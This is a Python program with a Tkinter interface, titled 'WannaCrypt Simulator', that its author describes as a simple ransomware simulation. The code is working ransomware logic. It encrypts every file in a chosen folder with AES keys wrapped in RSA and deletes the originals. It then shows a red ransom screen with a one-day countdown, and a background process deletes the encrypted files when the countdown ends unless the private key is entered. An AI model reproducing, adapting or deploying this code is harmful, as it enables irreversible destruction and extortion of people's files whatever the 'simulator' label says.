import os
import json
import datetime
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from PIL import Image, ImageTk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import rsa
import threading
import multiprocessing
import time

def generate_rsa_keys():
    if not os.path.exists("private.pem") or not os.path.exists("public.pem"):
        public_key, private_key = rsa.newkeys(2048)
        with open("public.pem", "wb") as pub_file:
            pub_file.write(public_key.save_pkcs1())
        with open("private.pem", "wb") as priv_file:
            priv_file.write(private_key.save_pkcs1())

def load_rsa_keys():
    with open("public.pem", "rb") as pub_file:
        public_key = rsa.PublicKey.load_pkcs1(pub_file.read())
    with open("private.pem", "rb") as priv_file:
        private_key = rsa.PrivateKey.load_pkcs1(priv_file.read())
    return public_key, private_key

def save_encryption_time(folder_path):
    timestamp = datetime.datetime.now().timestamp()
    temp_file = os.path.join(folder_path, "encryption_time.json")
    with open(temp_file, "w") as f:
        json.dump({"timestamp": timestamp, "folder": folder_path}, f)

def check_and_delete_files(folder_path, duration=10):
    temp_file = os.path.join(folder_path, "encryption_time.json")
    if os.path.exists(temp_file):
        with open(temp_file, "r") as f:
            data = json.load(f)
        encryption_time = data["timestamp"]
        current_time = datetime.datetime.now().timestamp()
        if current_time - encryption_time >= duration:
            delete_encrypted_files(folder_path)
            os.remove(temp_file)

def delete_encrypted_files(folder_path):
    for file in os.listdir(folder_path):
        if file.endswith(".enc"):
            os.remove(os.path.join(folder_path, file))
    messagebox.showinfo("Deletion Complete", "Encrypted files have been deleted!")

def encrypt_file(file_path, public_key):
    aes_key = os.urandom(32)
    cipher = AES.new(aes_key, AES.MODE_CBC)
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    encrypted_key = rsa.encrypt(aes_key, public_key)
    with open(file_path + ".enc", "wb") as file:
        file.write(encrypted_key + cipher.iv + encrypted_data)
    os.remove(file_path)

def countdown_timer(duration, folder_path):
    remaining_time = duration  # Durasi dalam detik
    def update_countdown():
        nonlocal remaining_time
        if remaining_time > 0:
            days = remaining_time // 86400  # Hitung jumlah hari
            hours = (remaining_time % 86400) // 3600  # Hitung jumlah jam
            minutes = (remaining_time % 3600) // 60  # Hitung jumlah menit
            seconds = remaining_time % 60  # Hitung jumlah detik

            # Format waktu dengan dua digit
            time_format = f"{days:02}:{hours:02}:{minutes:02}:{seconds:02}"
            countdown_label.config(text=f"Files will be deleted in {time_format}")

            remaining_time -= 1  # Kurangi satu detik
            root.after(1000, update_countdown)  # Update setiap 1 detik
        else:
            delete_encrypted_files(folder_path)
    
    update_countdown()

def persistent_timer(duration, folder_path):
    time.sleep(duration)
    delete_encrypted_files(folder_path)

def encrypt_folder():
    folder_path = filedialog.askdirectory(title="Select Folder to Encrypt")
    if not folder_path:
        return
    generate_rsa_keys()
    public_key, _ = load_rsa_keys()
    files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
    if not files:
        messagebox.showwarning("Warning", "No files found in folder!")
        return
    for file_path in files:
        encrypt_file(file_path, public_key)
    save_encryption_time(folder_path)
    messagebox.showinfo("Success", "Folder encrypted successfully!")
    # Ubah durasi countdown ke 1 hari (86.400 detik)
    threading.Thread(target=countdown_timer, args=(86400, folder_path), daemon=True).start()  # 86400 detik = 1 hari
    process = multiprocessing.Process(target=persistent_timer, args=(86400, folder_path))
    process.start()

def decrypt_folder():
    folder_path = filedialog.askdirectory(title="Select Folder to Decrypt")
    if not folder_path:
        return
    key_input = simpledialog.askstring("Private Key Input", "Enter the private key:")
    if not key_input:
        messagebox.showwarning("Warning", "Decryption cancelled: No key entered.")
        return
    try:
        private_key = rsa.PrivateKey.load_pkcs1(key_input.encode())
    except ValueError:
        messagebox.showerror("Error", "Invalid private key format!")
        return
    files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if f.endswith(".enc")]
    if not files:
        messagebox.showwarning("Warning", "No encrypted files found in folder!")
        return
    for file_path in files:
        with open(file_path, "rb") as file:
            encrypted_key = file.read(256)
            iv = file.read(16)
            encrypted_data = file.read()
        aes_key = rsa.decrypt(encrypted_key, private_key)
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        original_file_path = file_path.replace(".enc", "")
        with open(original_file_path, "wb") as file:
            file.write(decrypted_data)
        os.remove(file_path)
    
    messagebox.showinfo("Success", "Folder decrypted successfully!")
    root.quit()  # Menutup aplikasi setelah dekripsi selesai

root = tk.Tk()
root.title("WannaCrypt Simulator")
root.geometry("1300x840")
root.configure(bg="#B20000")
lock_image = Image.open("lock.png").resize((300, 300))
lock_photo = ImageTk.PhotoImage(lock_image)
lock_label = tk.Label(root, image=lock_photo, bg="#B20000")
lock_label.pack(pady=10)
label_title = tk.Label(root, text="Oops, your files have been encrypted!", font=("Courier", 25, "bold"), fg="white", bg="#B20000")
label_title.pack(pady=15)
label_title = tk.Label(root, text="This ransomware was created by a developer named Noval H.W whose aim was only to simulate a simple ransomware attack.", 
font=("Courier", 15), fg="white", bg="#B20000", wraplength=600)
label_title.pack(pady=15)
countdown_label = tk.Label(root, text="", font=("Courier", 20), fg="white", bg="#B20000")
countdown_label.pack(pady=10)
btn_encrypt = tk.Button(root, text="🔒 Encrypt Folder", font=("Courier", 20), bg="black", fg="white", command=encrypt_folder)
btn_encrypt.pack(pady=10, ipadx=10, ipady=5)
btn_decrypt = tk.Button(root, text="🔓 Decrypt Folder", font=("Courier", 20), bg="black", fg="white", command=decrypt_folder)
btn_decrypt.pack(pady=10, ipadx=10, ipady=5)

folder_path = filedialog.askdirectory(title="Select Folder to Check")
if folder_path:
    check_and_delete_files(folder_path, 86400)  # 86400 detik = 1 hari

root.mainloop()
